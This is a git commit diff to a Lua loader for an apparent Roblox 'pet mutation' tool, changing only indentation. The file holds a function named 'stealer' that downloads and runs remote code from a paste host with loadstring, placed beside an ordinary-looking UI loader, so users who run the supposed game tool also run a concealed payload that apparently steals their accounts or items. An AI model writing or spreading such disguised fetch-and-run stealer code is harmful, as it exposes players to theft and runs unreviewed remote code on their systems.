7f19b0ecff01d113b3d95dfb38f73b7b31df1c17
ZeoHubs <voidzskie@gmail.com>
2025-07-23 02:28:08 +0800

    Update Loader.lua

--- PetMutation/Loader.lua
+++ PetMutation/Loader.lua
@@ -1,5 +1,5 @@
 local function stealer()
- loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/syXrVCaWqDtssXWI/raw", true))()
+  loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/syXrVCaWqDtssXWI/raw", true))()
 end
 local function loadui()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/imalwaysbeamediocre/PetSpawner/refs/heads/main/Mutations.lua"))()
